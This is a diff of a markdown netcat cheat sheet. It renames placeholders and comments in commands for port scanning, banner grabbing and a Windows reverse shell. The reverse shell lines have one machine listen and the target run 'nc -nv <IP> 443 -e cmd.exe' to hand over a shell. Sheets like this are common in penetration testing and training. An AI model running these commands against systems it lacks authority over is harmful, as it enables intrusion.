@@ -34,7 +34,7 @@ Netcat which has been famously labeled as the "Swiss army knife of hacking" is a
 `nc -z <IP> <PORT RANGE>`
 
 #### Banner Grabbing  
-`echo "" | nc -nv -w1 <IP Address> <Ports>`
+`echo "" | nc -nv -w1 <IP> <PORTS>`
 
 # Windows  
 ***
@@ -43,8 +43,8 @@ Netcat which has been famously labeled as the "Swiss army knife of hacking" is a
 `nc -nv <IP> 4444`
 
 #### Reverse Shell  
-`nc -lvp 443 # Attacking Machine - Receiving`  
-`nc -nv <IP> 443 -e cmd.exe # Target Machine - Sending`
+`nc -lvp 443 # Attacker - Receiving`  
+`nc -nv <IP> 443 -e cmd.exe # Target - Sending`
 
 # Nix  
 ***
